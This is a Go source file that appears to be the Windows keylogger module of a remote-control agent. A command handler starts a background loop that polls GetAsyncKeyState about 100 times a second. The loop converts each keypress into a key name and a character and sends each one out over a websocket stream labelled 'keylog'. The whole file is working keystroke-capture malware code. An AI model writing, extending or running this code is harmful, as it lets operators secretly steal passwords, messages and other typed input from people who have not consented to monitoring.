//go:build windows

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	keylogMu     sync.Mutex
	keylogCancel context.CancelFunc
)

func execKeylog(payload json.RawMessage) map[string]any {
	var p struct {
		Action string `json:"action"`
	}
	_ = json.Unmarshal(payload, &p)

	if p.Action == "stop" {
		keylogMu.Lock()
		if keylogCancel != nil {
			keylogCancel()
			keylogCancel = nil
		}
		keylogMu.Unlock()
		return map[string]any{"status": "stopped"}
	}

	keylogMu.Lock()
	if keylogCancel != nil {
		keylogCancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	keylogCancel = cancel
	keylogMu.Unlock()

	go runKeylogWin(ctx)

	return map[string]any{"status": "started", "method": "GetAsyncKeyState"}
}

func runKeylogWin(ctx context.Context) {
	debugLog.Printf("keylog: %v")
	defer debugLog.Printf("[keylog] stopped")

	user32 := syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
	toUnicode := user32.NewProc("ToUnicode")
	getKeyboardState := user32.NewProc("GetKeyboardState")

	var prevState [256]bool
	var kbState [256]byte

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		for vk := 1; vk < 256; vk++ {
			ret, _, _ := getAsyncKeyState.Call(uintptr(vk))
			// Bit 0 = just pressed, bit 15 = currently down
			pressed := (ret & 0x0001) != 0

			if pressed && !prevState[vk] {
				keyName := vkToName(vk)

				// Try to get Unicode character
				getKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
				var buf [4]uint16
				scanCode, _, _ := user32.NewProc("MapVirtualKeyW").Call(uintptr(vk), 0)
				toUnicode.Call(
					uintptr(vk), scanCode,
					uintptr(unsafe.Pointer(&kbState[0])),
					uintptr(unsafe.Pointer(&buf[0])),
					4, 0,
				)

				char := ""
				if buf[0] >= 32 && buf[0] < 127 {
					char = string(rune(buf[0]))
				}

				wsSend("stream_frame", map[string]any{
					"stream": "keylog",
					"key": keyName,
					"char": char,
					"vk": vk,
					"timestamp": time.Now().Format(time.RFC3339Nano),
				})
			}
			prevState[vk] = pressed
		}

		// Poll every 10ms (~100Hz, negligible CPU for simple state checks)
		time.Sleep(10 * time.Millisecond)
	}
}

func vkToName(vk int) string {
	names := map[int]string{
		0x08: "BACKSPACE", 0x09: "TAB", 0x0D: "ENTER", 0x10: "SHIFT",
		0x11: "CTRL", 0x12: "ALT", 0x13: "PAUSE", 0x14: "CapsLock",
		0x1B: "ESC", 0x20: "Space", 0x21: "PAGEUP", 0x22: "PAGEDOWN",
		0x23: "END", 0x24: "HOME", 0x25: "LEFT", 0x26: "UP",
		0x27: "RIGHT", 0x28: "DOWN", 0x2C: "PRINTSCREEN", 0x2D: "INSERT",
		0x2E: "DELETE", 0x5B: "LWIN", 0x5C: "RWIN",
		0x70: "F1", 0x71: "F2", 0x72: "F3", 0x73: "F4", 0x74: "F5",
		0x75: "F6", 0x76: "F7", 0x77: "F8", 0x78: "F9", 0x79: "F10",
		0x7A: "F11", 0x7B: "F12",
	}
	if name, ok := names[vk]; ok {
		return name
	}
	if vk >= 0x30 && vk <= 0x39 {
		return fmt.Sprintf("%c", rune(vk))
	}
	if vk >= 0x41 && vk <= 0x5A {
		return fmt.Sprintf("%c", rune(vk))
	}
	return fmt.Sprintf("VK_%d", vk)
}
